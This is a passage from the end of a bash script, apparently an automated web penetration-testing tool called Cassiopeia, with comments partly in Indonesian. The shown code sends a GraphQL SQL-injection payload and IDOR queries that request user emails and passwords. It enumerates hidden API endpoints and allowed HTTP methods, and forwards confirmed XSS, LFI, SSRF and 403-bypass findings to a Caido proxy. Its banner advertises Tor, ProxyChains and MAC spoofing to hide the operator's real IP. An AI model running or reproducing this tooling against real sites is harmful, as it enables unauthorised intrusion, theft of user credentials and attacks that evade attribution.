                GQL_SQLI=$(px curl -sk -X POST \
                    -H "Content-Type: application/json" \
                    -d '{"query":"{ users(id: \"1 OR 1=1--\") { id name email } }"}' \
                    "$GQL_EP" 2>/dev/null)
                echo "$GQL_SQLI" | grep -qiE "syntax error|sql|mysql|postgres" && \
                    echo "[!] GRAPHQL SQL ERROR -- potential SQLi"
                echo "$GQL_SQLI" | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    users = d.get('data',{}).get('users',[])
    if users and len(users) > 1:
        print(f'[!!!] GRAPHQL SQLi CONFIRMED: {len(users)} users returned')
except: pass
" 2>/dev/null

                # IDOR via GraphQL
                echo ""
                echo "--- IDOR via GraphQL ---"
                for q in 'user(id:1)' 'user(id:2)' 'profile(id:1)'; do
                    RESP=$(px curl -sk -X POST \
                        -H "Content-Type: application/json" \
                        -d "{\"query\":\"{ ${q} { id name email password } }\"}" \
                        "$GQL_EP" 2>/dev/null)
                    echo "$RESP" | grep -qiE '"email"\|"password"\|"id"' && \
                        echo "[!!!] GRAPHQL IDOR: ${q} -> data exposed"
                done
            fi

        } | tee "${OUTPUT_DIR}/graphql/deep_test.txt"
        GQL_DEEP=$(grep -c "!!!" \
            "${OUTPUT_DIR}/graphql/deep_test.txt" 2>/dev/null || echo 0)
        notify OK "GraphQL deep -> ${GQL_DEEP} critical -> graphql/deep_test.txt"
    }

    # ── P6.7: API VERSIONING & ENDPOINT ENUM ─────────────────
    notify INFO "API versioning & hidden endpoint enumeration..."
    tool_done "${OUTPUT_DIR}/api/versioning.txt" 10 || {
        {
            echo "=== API VERSIONING TEST === $(date)"

            API_VERSIONS=(v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 \
                          1.0 2.0 3.0 beta alpha latest current)
            API_BASES=(/api /rest /service /services /endpoint)

            echo "--- Version enumeration ---"
            for base in "${API_BASES[@]}"; do
                for ver in "${API_VERSIONS[@]}"; do
                    CODE=$(rq -o /dev/null -w "%{http_code}" \
                           --max-time 4 "${TARGET_URL}${base}/${ver}" 2>/dev/null)
                    [[ "$CODE" =~ ^(200|201|301|302|401|403)$ ]] && \
                        echo "[FOUND] ${TARGET_URL}${base}/${ver} -> HTTP $CODE"
                done
            done

            echo ""
            echo "--- Deprecated API endpoints ---"
            for old_ep in "/api/v1/users" "/api/v2/admin" \
                          "/internal/api" "/private/api" \
                          "/debug/api" "/test/api" \
                          "/_api" "/__api" "/api_old" "/api_v1"; do
                CODE=$(rq -o /dev/null -w "%{http_code}" \
                       --max-time 4 "${TARGET_URL}${old_ep}" 2>/dev/null)
                [[ "$CODE" =~ ^(200|201|401|403)$ ]] && \
                    echo "[FOUND] ${TARGET_URL}${old_ep} -> HTTP $CODE"
            done

            echo ""
            echo "--- HTTP Method fuzzing ---"
            for ep in "/api/user" "/api/admin" "/api/v1/user"; do
                CODE_GET=$(rq -X GET -o /dev/null -w "%{http_code}" \
                           --max-time 4 "${TARGET_URL}${ep}" 2>/dev/null)
                for method in PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
                    CODE=$(rq -X $method -o /dev/null -w "%{http_code}" \
                           --max-time 4 "${TARGET_URL}${ep}" 2>/dev/null)
                    [[ "$CODE" != "$CODE_GET" && "$CODE" =~ ^(200|201|204)$ ]] && \
                        echo "[!] METHOD ${method} allowed: ${TARGET_URL}${ep} -> $CODE"
                done
            done

        } | tee "${OUTPUT_DIR}/api/versioning.txt"
        API_CNT=$(grep -c "FOUND\|\[!\]" \
            "${OUTPUT_DIR}/api/versioning.txt" 2>/dev/null || echo 0)
        notify OK "API versioning -> ${API_CNT} findings -> api/versioning.txt"
    }
fi

#  CAIDO INTEGRATION -- AUTO SEND KE CAIDO GUI
# ================================================================
separator "CAIDO INTEGRATION -- AUTO MANUAL TESTING"
notify PHASE "Sending all findings to Caido for manual testing..."

CAIDO_PROXY="127.0.0.1:8080"
CAIDO_URL="http://127.0.0.1:8080"

# Checking apakah Caido lagi jalan
CAIDO_RUNNING=false
if curl -sk --max-time 3 "$CAIDO_URL" > /dev/null 2>&1; then
    CAIDO_RUNNING=true
    notify OK "Caido detected at ${CAIDO_PROXY}"
else
    notify WARN "Caido not running at ${CAIDO_PROXY}"
    echo -e "${CYAN}  [?] Start Caido first? Script will wait... (y/n):${NC}"
    read -rp "  > " START_CAIDO
    if [[ "$START_CAIDO" == "y" ]]; then
        # Coba start Caido di background
        if command -v caido &>/dev/null; then
            notify INFO "Starting Caido..."
            caido &>/dev/null &
            sleep 5
        elif [[ -f "${HOME}/.local/bin/caido" ]]; then
            "${HOME}/.local/bin/caido" &>/dev/null &
            sleep 5
        elif [[ -f "/opt/caido/caido" ]]; then
            /opt/caido/caido &>/dev/null &
            sleep 5
        fi
        # Checking lagi
        curl -sk --max-time 5 "$CAIDO_URL" > /dev/null 2>&1 &&             CAIDO_RUNNING=true && notify OK "Caido started successfully!" ||             notify WARN "Caido could not be auto-started -- start manually"
    fi
fi

if [[ "$CAIDO_RUNNING" == "true" ]]; then
    notify INFO "Sending URLs to Caido via proxy replay..."

    # Kirim semua URLs dengan params ke Caido proxy
    # Caido akan otomatis intercept dan log semua request
    SENT=0
    TOTAL_URLS=$(wc -l < "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null || echo 0)

    notify INFO "Replaying ${TOTAL_URLS} URLs via Caido proxy..."

    head -200 "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null |     while IFS= read -r url; do
        curl -sk --max-time 5             --proxy "$CAIDO_PROXY"             -H "X-Cassiopeia-Source: automated-replay"             -H "X-Cassiopeia-Target: ${DOMAIN}"             "$url" > /dev/null 2>&1
        SENT=$((SENT+1))
        # Progress
        [[ $((SENT % 10)) -eq 0 ]] &&             printf "
  ${CYAN}[>] Sent: ${SENT}/${TOTAL_URLS}${NC}"
    done
    echo ""
    notify OK "URLs sent to Caido -- check History tab in Caido GUI"

    # Kirim juga verified findings khusus
    notify INFO "Sending verified findings for manual verification..."
    {
        # XSS findings
        grep "CONFIRMED\|POC" "${OUTPUT_DIR}/xss/xss_verified.txt"             "${OUTPUT_DIR}/xss/dalfox.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # LFI findings
        grep "CONFIRMED\|LFI" "${OUTPUT_DIR}/lfi/lfi_verified.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # SSRF findings
        grep "CONFIRMED\|POTENTIAL" "${OUTPUT_DIR}/ssrf/ssrf_verified.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # 403 bypass
        grep "BYPASS" "${OUTPUT_DIR}/auth/bypass_403.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

        # API endpoints found
        grep "FOUND" "${OUTPUT_DIR}/api/api_discovery.txt" 2>/dev/null |             grep -oE "https?://[^ ]+" | sort -u

    } | sort -u | while IFS= read -r url; do
        curl -sk --max-time 5             --proxy "$CAIDO_PROXY"             -H "X-Cassiopeia-Source: verified-finding"             -H "X-Cassiopeia-Priority: HIGH"             "$url" > /dev/null 2>&1
    done
    notify OK "Verified findings sent to Caido -- filter X-Cassiopeia-Source: verified-finding"

    # Buka Caido GUI di browser
    notify INFO "Opening Caido GUI in browser..."
    CAIDO_GUI_URL="http://127.0.0.1:7777"

    # Checking Caido GUI port (biasanya 7777)
    if curl -sk --max-time 3 "$CAIDO_GUI_URL" > /dev/null 2>&1; then
        if [[ "${CAIDO_AUTO_OPEN:-0}" == "1" ]] && command -v xdg-open &>/dev/null; then
            xdg-open "$CAIDO_GUI_URL" &>/dev/null &
        elif command -v firefox &>/dev/null; then
            firefox "$CAIDO_GUI_URL" &>/dev/null &
        elif command -v chromium &>/dev/null; then
            chromium "$CAIDO_GUI_URL" &>/dev/null &
        fi
        notify OK "Caido GUI opened at ${CAIDO_GUI_URL}"
    else
        notify INFO "Open Caido GUI manually at: ${CAIDO_GUI_URL}"
    fi

    echo ""
    echo -e "${YELLOW}  Caido tips for manual testing:${NC}"
    echo -e "  1. Check History tab -- all URLs are there"
    echo -e "  2. Filter: X-Cassiopeia-Source: verified-finding = priority findings"
    echo -e "  3. Klik URL -> Send to Replaying -> modifikasi payload manual"
    echo -e "  4. Use Automate for mass fuzzing of discovered endpoints"
    echo -e "  5. Check Intercept -- proxy active at ${CAIDO_PROXY}"
    echo ""
else
    notify WARN "Caido not active -- skipping auto-send"
    notify INFO "Manual: start Caido, set proxy ${CAIDO_PROXY}, open target"
fi

# ================================================================
#  SELESAI
# ================================================================
echo -e "\n${GREEN}${BOLD}"
echo "+==================================================================+"
echo "|         CASSIOPEIA PENTEST v4.0.0 -- COMPLETE!                   |"
echo "|         by Xyra77                                                |"
echo "+------------------------------------------------------------------+"
echo "|  [OK] Section 1 : OPSEC (Tor + ProxyChains + MAC Spoof)          |"
echo "|  [OK] Section 2 : Main Pentest (15 Phases, 40+ Tools)             |"
echo "|  [OK] Section 3 : Advanced Pentest (PP + Code Inj + Browser XSS) |"
echo "|  [OK] Section 4 : HTML Report + CVSS Scoring + Full Audit        |"
echo "|  [OK] Caido    : Auto-send URLs + Open GUI                      |"
echo "+==================================================================+"
echo -e "${NC}"
echo -e "${CYAN}  Output Dir : ${BOLD}${OUTPUT_DIR}/${NC}"
echo -e "${CYAN}  HTML Report : ${BOLD}${HTML_FILE}${NC}"
echo -e "${GREEN}  IP via Tor : ${BOLD}${TOR_IP}${NC}"
echo -e "${RED}  Real IP     : ${BOLD}${REAL_IP} (hidden)${NC}"
echo ""
echo -e "${YELLOW}  Buka report:${NC}"
echo -e "  ${BOLD}firefox ${HTML_FILE}${NC}"
echo -e "  ${BOLD}chromium ${HTML_FILE}${NC}"
echo ""
echo -e "${YELLOW}  Caido:${NC}"
echo -e "  ${BOLD}http://127.0.0.1:7777${NC}"
echo ""
echo -e "${RED}  AUTHORIZED PENETRATION TESTING ONLY!${NC}"

systemctl stop tor 2>/dev/null
